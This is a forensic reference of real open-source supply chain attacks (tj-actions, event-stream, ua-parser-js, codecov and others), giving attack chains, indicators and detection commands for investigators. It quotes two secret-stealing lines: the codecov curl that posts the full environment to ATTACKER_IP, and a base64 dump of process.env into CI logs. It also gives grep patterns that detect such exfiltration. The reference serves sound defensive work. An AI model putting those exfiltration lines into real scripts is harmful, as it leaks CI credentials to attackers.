# Supply Chain Attack Patterns Reference

Known real-world open-source supply chain attacks used as reference patterns for Phase 2–4
of the OSS Forensics pipeline. When investigating a new incident, compare evidence against
these case studies to identify pattern matches and inform hypothesis formation.

---

## Case 1: tj-actions/changed-files (CVE-2025-30066)

**Date:** March 14–15, 2025  
**Type:** GitHub Action compromise via maintainer account takeover  
**Severity:** CRITICAL — CI secrets stolen from thousands of repositories  

### What Happened

The `tj-actions/changed-files` GitHub Action (used in 23,000+ repositories) was compromised. Attackers modified the action's code to exfiltrate CI/CD secrets — specifically, the `GITHUB_TOKEN` and any other secrets accessible in the runner environment — to an external endpoint. Because many workflows pinned to a floating tag (e.g., `v45`) rather than a commit SHA, the malicious code executed silently across all affected pipelines.

### Attack Chain

1. **Maintainer account compromise** — The `tj-actions` bot/maintainer account was compromised (likely via phishing or stolen session token).
2. **Workflow modification** — The action's `dist/index.js` was modified to include exfiltration code.
3. **Tag manipulation** — Existing tags (e.g., `v45`, `v46`) were force-moved to point to the malicious commit. Consumers who pinned to a tag (not SHA) automatically executed the malicious code.
4. **Secret exfiltration** — On each CI run, the action printed all accessible secrets to the workflow log in an encoded format (initially missed by users scanning log output).
5. **Detection** — Detected by community security researchers monitoring GH Archive for anomalous tag movements on the `tj-actions` org.

### Forensic Indicators

- Tag `v45` moved to commit `0e58ed8` (force-tag update)
- Commit `0e58ed8` added exfiltration code to `dist/index.js`
- `dist/index.js` contained base64-encoded payload decoding secrets
- GH Archive showed `PushEvent` for `tj-actions/changed-files` at unusual UTC hour
- Commit authored by known bot account but from an unusual IP origin

### Detection Commands

```bash
# Check if a tag was recently moved
git log --all --format="%H %aI %s" -- dist/index.js

# Verify that tags point to expected SHAs (compare to release history)
git tag -l | xargs -I{} git rev-list -n1 {}

# Check for exfiltration patterns in dist files
grep -r "process\.env\|Buffer\.from\|atob\|fetch\|http\.get" dist/
```

### Lessons for Forensics

- **Always pin GitHub Actions to a commit SHA**, not a tag: `uses: tj-actions/changed-files@{sha}`
- Force-moved tags are invisible to users but visible in GH Archive `PushEvent` with `forced: true`
- Compiled `dist/` files often differ from source — always diff `dist/` against rebuilt artifacts
- Check: does the repo's `dist/` match `npm run build` output? Hash mismatch = compromise indicator

### Reference IOC Patterns

- Force-updated tags on a GitHub Action repository
- Modification of `dist/index.js` or compiled action artifact
- `process.env` enumeration added to action code
- Log-based exfiltration: `core.info(Buffer.from(JSON.stringify(process.env)).toString("base64"))`

---

## Case 2: event-stream (2018)

**Date:** September–November 2018  
**Type:** New malicious maintainer added, backdoor injected via dependency  
**Package:** `event-stream` (npm, ~2M weekly downloads)  

### What Happened

The original maintainer (Dominic Tarr) transferred `event-stream` to a new account (`right9ctrl`) after receiving a GitHub message claiming to want to help maintain the package. `right9ctrl` added a new dependency (`flatmap-stream`) that contained an encrypted payload targeting the Copay Bitcoin wallet application specifically — designed to steal Bitcoin from users of that app.

### Attack Chain

1. **Social engineering** — Attacker contacted original maintainer claiming to want to maintain the abandoned package.
2. **Maintainer transfer** — Legitimate transfer of npm publish rights + GitHub collaborator access.
3. **Malicious dependency added** — `flatmap-stream@0.1.1` added to `event-stream`'s dependencies.
4. **Encrypted payload** — `flatmap-stream` contained AES-encrypted malicious code; decryption key was derived from `copay-dash`'s test suite — the payload only activated if the host app's test suite contained the key.
5. **Targeted theft** — Code specifically targeted `copay` wallets, exfiltrating private keys when wallet balance exceeded a threshold.
6. **Discovery** — Detected by a user noticing `event-stream` now depended on a previously unknown package.

### Forensic Indicators

- New npm maintainer (`right9ctrl`) published `event-stream@3.3.6` in September 2018
- `flatmap-stream` dependency appeared in `event-stream@3.3.6` — had no prior relationship
- `flatmap-stream@0.1.1` (published same day) contained encrypted `~/.test.js` with AES payload
- Original `event-stream` package had no version releases for 3+ years before the attack
- `right9ctrl` npm account created within days of the transfer request

### Detection Commands

```bash
# Check npm publish timeline
curl -s https://registry.npmjs.org/event-stream | jq '.time'

# Compare dependencies across versions
curl -s https://registry.npmjs.org/event-stream/3.3.5 | jq '.dependencies'
curl -s https://registry.npmjs.org/event-stream/3.3.6 | jq '.dependencies'

# Check maintainer changes across versions
curl -s https://registry.npmjs.org/event-stream | \
  jq '.versions | to_entries[] | {v: .key, maintainers: .value.maintainers}'

# Audit new dependencies for suspicious content
npm pack flatmap-stream@0.1.1 && tar -xzf flatmap-stream-0.1.1.tgz
grep -r "eval\|exec\|base64\|decrypt" package/
```

### Lessons for Forensics

- **Dormant packages are high-value targets** — attackers prefer packages with large dependency graphs but low maintainer activity.
- New dependencies introduced in minor/patch versions without changelog explanation are suspicious.
- Check npm maintainer ownership changes via registry API — compare `_npmUser` across versions.
- Encrypted payloads require dynamic analysis — static grep may not detect them.

---

## Case 3: ua-parser-js (2021)

**Date:** October 22–23, 2021  
**Type:** Hijacked npm account, published malware versions  
**Package:** `ua-parser-js` (npm, ~8M weekly downloads)  

### What Happened

The legitimate maintainer's npm account was compromised (credential theft). The attacker published three malicious versions (0.7.29, 0.8.0, 1.0.1) containing a cryptocurrency miner and a trojan that targeted Linux and Windows systems.

### Attack Chain

1. **Account hijack** — Maintainer's npm credentials compromised (likely via credential stuffing or phishing).
2. **Malicious versions published** — Three versions published in quick succession: `0.7.29`, `0.8.0`, `1.0.1`.
3. **Malware payloads** — Each version included OS detection logic:
   - Linux: downloaded a shell script from `nocodewithal.ru` and launched XMRig (Monero miner)
   - Windows: downloaded `jsextension.exe` from the same host
4. **Discovery** — The legitimate maintainer noticed unusual npm activity and posted a warning on GitHub issues.
5. **Response** — npm yanked the malicious versions within hours.

### Forensic Indicators

- Three versions published within a 1-hour window (registry velocity anomaly)
- New publisher (`_npmUser`) on the malicious versions (or same username but different session)
- `package.json` `scripts.preinstall` modified to run shell download
- Network connection to `nocodewithal.ru` (IOC domain)
- `jsextension.exe` / `jsextension` binary added to package contents

### Detection Commands

```bash
# Check publish velocity
curl -s https://registry.npmjs.org/ua-parser-js | jq '.time | to_entries[] | select(.key | test("^0\\.(7\\.29|8\\.0)|^1\\.0\\.1$")) | .value'

# Check preinstall scripts in affected versions
curl -s https://registry.npmjs.org/ua-parser-js/0.7.29 | jq '.scripts'

# Verify package integrity (compare dist hash)
npm pack ua-parser-js@0.7.28
npm pack ua-parser-js@0.7.29
# diff the two tarballs
```

### Pattern Match for New Investigations

- Multiple versions published in < 2 hours: HIGH suspicion
- `preinstall`/`postinstall` added in a version that previously had none: CRITICAL
- Binary executable included in npm package: CRITICAL
- Network calls to domains registered < 30 days before publish: HIGH

---

## Case 4: colors.js / faker.js (2022)

**Date:** January 4–5, 2022  
**Type:** Intentional maintainer sabotage  
**Packages:** `colors` (~23M weekly downloads), `faker` (~2.8M weekly downloads)  

### What Happened

The original author (Marak Squires) deliberately introduced an infinite loop into `colors.js` and replaced `faker.js` with a version that printed "LIBERTY LIBERTY LIBERTY" followed by gibberish, in protest of what he characterized as companies exploiting open source without compensation.

### Attack Chain

1. **Legitimate maintainer action** — No account compromise; the legitimate owner made the change.
2. **colors@1.4.44-liberty-2** — Added `for(;;){}` infinite loop in main module.
3. **faker@6.6.6** — Published replacement that corrupted output.
4. **Immediate downstream breakage** — AWS CDK, Azure SDK, and thousands of other packages broke.
5. **Response** — npm reverted `colors` to a previous safe version (`1.4.1`) — a controversial moderation action.

### Forensic Indicators

- Single commit with an infinite loop added to a critical code path
- Unusual version naming (`liberty-2`, `6.6.6` as "evil" version number signal)
- No PR, no review, direct commit by sole maintainer
- Commit message: "LIBERTY LIBERTY LIBERTY"
- No reproducible build issues — the change was intentional and simple

### Lessons for Forensics

- **Insider/maintainer sabotage is a distinct threat model** from account compromise.
- Look for motive indicators: public statements, GitHub issues expressing grievances, social media.
- Even simple changes (infinite loops, console output) can have massive downstream impact.
- Version numbers can be a signal: unusual suffixes, joke version numbers.

---

## Case 5: codecov Bash Uploader (2021)

**Date:** January 31 – April 1, 2021 (discovered April 1)  
**Type:** CI artifact modification (build system compromise)  
**Affected:** 29,000+ organizations  

### What Happened

Attackers gained access to Codecov's Google Cloud Storage and modified the Bash uploader script (`bash`) distributed via `https://codecov.io/bash`. The modification added a single line that exfiltrated all environment variables (including CI secrets like `CODECOV_TOKEN`, `AWS_*`, `GITHUB_TOKEN`) via a `curl` POST to an attacker-controlled server.

### Attack Chain

1. **GCS credential exposure** — Attackers obtained GCS credentials from a Codecov Docker image (exposed in the image build process).
2. **Script modification** — Modified `codecov.io/bash` to add: `git remote -v >> /tmp/.git.config && curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://ATTACKER_IP/upload/v2`
3. **Wide exposure window** — The malicious script served for 2+ months before detection.
4. **Detection** — HashiCorp security team noticed discrepancy between the script's published SHA256 hash and the live script.

### Forensic Indicators

- SHA256 of `codecov.io/bash` changed between Jan 31 and April 1 without announcement
- Added exfiltration line using `curl` with `env` command piped to attacker IP
- GCS bucket for codecov showed unauthorized write access in access logs
- Any CI logs from that period showing anomalous outbound connections to `104.200.31.x`

### Detection Commands

```bash
# Verify downloaded script hash
curl -s https://codecov.io/bash | sha256sum
# Compare to expected hash published in repo

# Check for the exfiltration pattern in CI scripts
grep -r "codecov.io/bash" .github/
# If present: pin to a specific SHA256 or version
```

### Lessons for Forensics

- **Verify checksums of all downloaded CI scripts** against published, out-of-band hashes.
- Bash scripts fetched with `curl | bash` cannot be verified at runtime.
- Log-based detection: unusual outbound connections during CI to previously unseen IPs.
- Pin to specific script version/hash rather than `latest`.

---

## Case 6: SolarWinds SUNBURST (2020)

**Date:** October 2019 – December 2020 (active compromise)  
**Type:** Build system compromise, signed malicious software  
**Impact:** US government agencies, Fortune 500 companies  

### What Happened

Nation-state threat actors (APT29/Cozy Bear) compromised SolarWinds' build environment and injected the SUNBURST backdoor into the Orion software build pipeline. The malicious code was compiled into legitimately signed software updates and distributed to ~18,000 customers.

### Attack Chain

1. **Build system infiltration** — Attackers gained access to the Orion build environment (exact initial vector debated: possible phishing, or compromise of a build server).
2. **Source code modification** — Modified `SolarWinds.Orion.Core.BusinessLayer.dll` to include SUNBURST backdoor.
3. **Dormancy** — SUNBURST lay dormant for 12–14 days after first execution to avoid sandbox detection.
4. **C2 communication** — Used DGA (domain generation algorithm) with `avsvmcloud.com` as the C2 domain, disguised as SolarWinds telemetry.
5. **Legitimate signing** — The modified code passed SolarWinds' build process and was signed with the legitimate SolarWinds certificate.

### Forensic Indicators for OSS Context

This case is less directly applicable to GitHub repos but informs what to look for in build systems:

- Unexplained changes to build scripts or CI pipelines
- Build artifacts that don't match source code when rebuilt
- Signed artifacts from automated build systems should be reproducible
- Network connections to unexpected domains from build runners
- Unusual process spawning during build (parent: MSBuild → child: cmd.exe → grandchild: curl)

### Lessons for Open Source

- **Reproducible builds** are the defense against build-system compromise.
- Compare artifact hashes against what would be produced from clean source.
- Audit CI/CD runner permissions — build systems should not have production credentials.

---

## Case 7: PyPI / npm Typosquatting Campaigns

**Date:** Ongoing since ~2018; major campaigns in 2022–2024  
**Type:** Fake packages mimicking popular names  

### Common Typosquatting Patterns

| Technique | Example | Target |
|-----------|---------|--------|
| Character swap | `requets` | `requests` |
| Extra character | `requestss` | `requests` |
| Hyphen/underscore swap | `python-dateutil` | `python_dateutil` |
| Prefix/suffix | `setup-tools` | `setuptools` |
| Homoglyph | `reqưests` (unicode) | `requests` |
| Combosquatting | `requests-aws` | `requests` |

### 2023 PyPI Malware Campaign: W4SP Stealer

- 116 packages published with names mimicking popular packages
- All contained code to steal Discord tokens, browser passwords, crypto wallets
- Exfiltration via Discord webhooks

**Detection:**
```bash
# Check for packages with similar names in your requirements.txt
pip install safety  # or use Google's OSV Scanner
osv-scanner --lockfile requirements.txt

# Manually verify package owner
curl https://pypi.org/pypi/PACKAGE_NAME/json | jq '.info.author, .info.home_page'
```

### 2022 npm IconBurst Campaign

- 24 npm packages with names like `icon-package`, `ionicons-5-icons` mimicking `ionicons`
- Contained obfuscated code to exfiltrate form data from websites

### Detection Heuristics for Typosquatting

1. **Levenshtein distance ≤ 2** from a top-1000 npm/PyPI package
2. Published within **30 days** with **< 10 downloads**
3. `homepage` / `repository` URL different from the legitimate package
4. Maintainer with **no other packages** or **account age < 30 days**
5. Package description identical to legitimate package but code differs

---

## Cross-Case Pattern Summary

| Attack Vector | Cases | Key Detection |
|---------------|-------|---------------|
| Account takeover | tj-actions, ua-parser-js | MemberEvent + velocity anomaly |
| Social engineering maintainer transfer | event-stream | Dormant package + new maintainer |
| Build system compromise | codecov, SolarWinds | Artifact hash mismatch |
| Maintainer sabotage | colors.js, faker.js | Motive + simple destructive change |
| Dependency confusion/typosquatting | PyPI/npm campaigns | Name similarity + new maintainer |
| Malicious CI Action | tj-actions | Force-moved tags + dist modification |

---

## When Investigating a New Incident

1. **Identify the attack type** first using behavioral IOCs (Phase 2).
2. **Match against the closest case study** from this reference.
3. **Apply the specific detection commands** from that case.
4. **Check for the same C2 infrastructure**: attackers reuse domains and IPs across campaigns.
5. **Cross-reference with threat intel**: search for the IOC domains/IPs in:
   - VirusTotal: `https://www.virustotal.com/gui/domain/{domain}`
   - Shodan: `https://www.shodan.io/host/{ip}`
   - AlienVault OTX: `https://otx.alienvault.com/indicator/domain/{domain}`
   - GitHub Advisory Database: `https://github.com/advisories?query={package}`

---

## Public Databases for Cross-Reference

| Database | URL | Coverage |
|----------|-----|---------|
| GitHub Advisory Database | https://github.com/advisories | GitHub-maintained CVEs |
| OSV (Open Source Vulnerabilities) | https://osv.dev | Multi-ecosystem vulns |
| npm security advisories | https://www.npmjs.com/advisories | npm-specific |
| PyPI safety database | https://pypi.org/project/safety/ | PyPI packages |
| Snyk Vulnerability DB | https://security.snyk.io | Broad OSS coverage |
| Socket.dev | https://socket.dev | Real-time supply chain monitoring |
| Checkmarx SCS | https://checkmarx.com/product/scs/ | Software composition |
